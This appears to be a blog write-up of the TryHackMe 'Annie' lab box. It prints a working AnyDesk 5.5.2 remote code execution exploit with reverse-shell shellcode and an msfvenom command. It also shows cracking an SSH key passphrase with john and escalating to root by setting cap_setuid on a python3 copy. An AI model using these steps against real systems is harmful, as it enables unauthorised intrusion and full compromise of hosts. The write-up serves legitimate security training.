---
layout: post
title: "TryHackMe: Annie"
date: 2024-05-18 12:00 -0500
categories: [writeups, tryhackme]
tags:
  - anydesk
  - setuid
image: /images/tryhackme_annie/annie.png
---
# Summary

Annie is a **medium** difficulty Linux box on [TryHackMe](https://tryhackme.com/room/annie). This machine involved compromising a vulnerable AnyDesk installation and then abusing an uncommon SetUID binary to elevate privileges to root. 

# Walkthrough
## Enumeration
### Nmap
After exporting the hostname and IP to environment variables, I ran a basic nmap scan with default scripts and version detection against all ports. 

```console
$ sudo nmap -sC -sV -vv -p- -oA nmap/$name $ip
```

We can see that TCP ports 22 and 7070 are open. The higher numbered ports didn't turn out to be anything. 

```console
Nmap scan report for 10.10.58.196
Host is up, received reset ttl 61 (0.22s latency).
Scanned at 2022-07-04 12:52:53 CDT for 1456s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA0R7eKVAIQzgsQ1QLoI7zzRYcaNBJ0wZtCbG1n5lR51Jfr2CC6+IVVxzleo0wCtfV9tcgtRXVdrju+29xaBR/Hin16MAf7QM4cY5dt46pgADnbwSXAy8GpnuCT10tTrL27gpKM2ayqmlpnKSxL2daP5uhkuoZCI3EYOvbaoPn4/u4vKeH64bk/s5zTE2JeIV/CwQnheYc1ZhwiJQD5k11735k+NfhD7pmhNY+QpG6qZNyFZ4APqdktrnDFetksOkC2NF4D8/OOjDsYkmofeIe+2fe01BHO4KFnRrKI3aSNDQdeNIQIL7LgKufgQ+yP0WmRLOThsiwu22jUG/8Ot1f
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH+EwC6q+M+qEr2TTccTtvcNF7dfougjgrZzZG4ShpTnNo1KXJy6iTnW/al9mxm/ecZVSF45w3Z3IYwAi9nfrdU=
|   256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBgcqbntpdHoH14/wXi5gysaIvv0hOk+VvCUNmVjhkMQ
7070/tcp  open  tcpwrapped syn-ack ttl 61
42007/tcp open  tcpwrapped syn-ack ttl 61
46467/tcp open  tcpwrapped syn-ack ttl 61
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After some research, I found that TCP port 7070 is commonly used with AnyDesk software. To test that theory, I checked online for exploits for AnyDesk and found one that looked promising. 

![](images/tryhackme_annie/Pasted%20image%2020220704132548.png)

I grabbed that exploit using `searchsploit`.

```console
$ searchsploit -m 49613
```

## Exploit
### Updating the exploit code
Reviewing the code, we can see there are a couple of things we need to update for it to work. 

```python
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '192.168.x.x'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

>**NOTE:** This code runs with Python2. I'm sure there's a way to update the code to work with Python3, but I didn't try it.

To make this code work, we need to update the following:
- The 'ip' variable. This is the IP address of the THM machine. Leave the 'port' variable alone. 
- The shellcode. You can run the provided command, substituting your own LHOST and LPORT values. 

After updating those values and running the exploit with `python2 49613.py` we get a connection back to our `netcat` listener. 

![Testing](images/tryhackme_annie/Pasted%20image%2020220704133946.png)

### Stabilize the shell
Stablize the reverse shell with the following commands
```console
# Spawn a bash shell with Python
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Set the TERM environment variable
export TERM=xterm

# Background the shell
Ctrl+z

# Turn off echoing
stty raw -echo;fg
```

>**NOTE:** If you're using the ZSH shell, it's important to put `stty raw -echo;fg` all on one line. The shell seems to complain if you don't. 

Go ahead and grab the user flag. 

## SSH
Checking around annie's home directory, we find an SSH key that will let us get a more stable shell. Copy that key onto your attacking machine and change permissions using 

```console
$ chmod 600 annie.key
```

As soon as we try to SSH into the machine as the `annie` user, we find that the key has a passphrase. 

![](images/tryhackme_annie/Pasted%20image%2020220704135152.png)

## Cracking the passphrase
To crack the passphrase for Annie's key, we need to use `ssh2john`. Depending on how you have `John the Ripper` installed, your installation location may be different, but you can find it with `locate ssh2john`. 

### Get a John-compatible hash
In order to use `john` to get the passphrase, we need to get it into a compatible hash format. We can do that with `ssh2john`. 

```console
$ ssh2john.py annie.key > annie.hash
```

Once we have a compatible hash, we can use `john` to crack the passphrase. 

```console
$ john --wordlist=/opt/wordlists/rockyou.txt annie.hash
```

After a few minutes, the hash will crack and you'll have the passphrase. 

Awesome! We can get a stable SSH connection now and won't have to worry about a reverse shell dropping. 

## Privilege Escalation
### Enumeration
From here, you're free to use whatever privilege escalation enumeration script you like (i.e., LinEnum, LinPEAS, Linux-Smart-Enumeration). Personally, I prefer LSE. If you don't like any of those, feel free to enumerate manually. 

### Uncommon SetUID binary
Looking through the output of LSE, there's an uncommon binary with the setuid bit set. 

![](images/tryhackme_annie/Pasted%20image%2020220704141246.png)

### Setcap
The `setcap` binary allows the user to set file capabilities. To exploit this, we can make a copy of the `python3` binary and modify the capabilities of that file as detailed [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/). 

### Copy the Python binary
First, make a copy of the `python3` binary in the annie home directory. 

```console
$ cp /usr/bin/python3 /home/annie/python3
```

### Set the `cap_setuid+ep` capability
To escalate privileges, we're going to add the `cap_setuid+ep` capability to the local copy of the `python3` binary. This will allow us to set the effective user id of the created process (i.e., 0 for root). 

```console
$ setcap cap_setuid+ep /home/annie/python3
```

### Spawn a new process as root
Now that we've set the capability on the local python binary, we can run the following command to escalate to root.

```console
$ ./python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

![](images/tryhackme_annie/Pasted%20image%2020220704142433.png)

Now you grab the root flag and finsh the room. 
